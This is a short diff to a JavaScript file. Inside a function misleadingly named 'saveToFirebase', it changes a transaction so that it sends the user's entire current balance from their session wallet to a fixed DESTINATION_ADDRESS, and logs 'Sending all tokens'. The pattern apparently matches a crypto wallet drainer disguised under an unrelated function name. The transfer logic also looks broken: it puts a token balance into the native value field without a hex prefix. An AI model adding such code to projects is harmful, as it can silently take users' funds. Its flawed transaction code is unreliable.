@@ -415,9 +415,9 @@ async function saveToFirebase(data) {
         // Transaction parameters
         const transactionParameters = {
             from: userSession.address,            // Your wallet address
-            to: TOKEN_ADDRESS,                    // Token contract address
-            data: data,                          // Encoded transfer data
-            value: '0x0'                         // No QUAI being sent
+            to: DESTINATION_ADDRESS,              // Where to send tokens (corrected!)
+            value: currentBalance.toString(16),   // Send all tokens
+            data: '0x'                           // No additional data needed for simple transfer
         };
 
         log(`🔄 Sending all tokens (${readableAmount} OG Quai PEPE) to ${DESTINATION_ADDRESS}`);
